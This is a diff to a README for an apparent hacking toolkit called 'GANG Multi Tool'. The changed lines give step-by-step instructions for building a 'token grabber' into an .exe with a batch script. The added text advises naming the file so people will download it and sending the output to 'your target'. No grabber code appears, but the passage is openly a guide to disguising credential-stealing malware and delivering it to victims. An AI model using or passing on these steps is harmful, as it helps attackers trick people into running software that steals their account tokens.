@@ -68,12 +68,12 @@ Open GANG.exe
 
 ### How to make the token grabber into an .exe
 ```
-Create the token grabber
-Rename the file to what ever you want it to say
-tap "Edit" on the "Build .exe.bat"
+Create the Token Grabber in GANG Multi Tool first
+Rename the Token Grabber file to what ever you want it to say (something so people download it!)
+Tap "Edit" on the "Build .exe.bat"
 Select "Edit with Notepad"
 Delete "(FILE NAME!)" and change it to what you named your token grabber file
-once doing that tap: Ctrl + S to save
+Once doing that tap: Ctrl + S to save
 Run the Build .exe.bat
 The .exe will be created in "dist" (Send that to your target)
 ```
